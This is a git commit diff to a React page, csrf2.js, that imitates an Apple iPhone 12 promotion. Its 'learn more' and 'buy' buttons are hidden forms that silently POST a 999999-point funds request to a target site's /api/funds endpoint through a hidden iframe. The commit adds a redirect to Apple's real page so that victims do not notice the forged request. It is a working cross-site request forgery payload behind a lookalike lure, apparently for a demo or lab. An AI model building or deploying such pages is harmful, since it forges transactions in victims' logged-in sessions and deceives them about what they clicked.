c9afe064d4d4ce697a034fbfc8a6999edb8385af
jayden <j5905653@gmail.com>
2021-06-23 03:53:12 +0800

    redirect

--- pages/csrf2.js
+++ pages/csrf2.js
@@ -5,18 +5,21 @@ class CsrfPage extends React.Component {
     static getInitialProps({query}) {
         return {query}
     }
+    onClick(){
+        window.location.href = "https://www.apple.com/tw/iphone-12/";
+    }
     render(){
         const {target} = this.props.query;
         return (
             <div>
                 <div className={s.iphone_big}>
-                    <div className={s.iphone_big_btn1}>
+                    <div className={s.iphone_big_btn1} onClick={this.onClick}>
                         <form method="POST" action={`http://${target}/api/funds`} target="iframeHidden">
                             <input type="hidden" name="points" value="999999"/>
                             <input type="submit" className="span4 btn btn-primary" value={"進一步了解"}/>
                          </form>
                     </div>
-                    <div className={s.iphone_big_btn2}>
+                    <div className={s.iphone_big_btn2} onClick={this.onClick}>
                         <form method="POST" action={`http://${target}/api/funds`} target="iframeHidden">
                             <input type="hidden" name="points" value="999999"/>
                             <input type="submit" className="span4 btn btn-primary" value={"購買"}/>
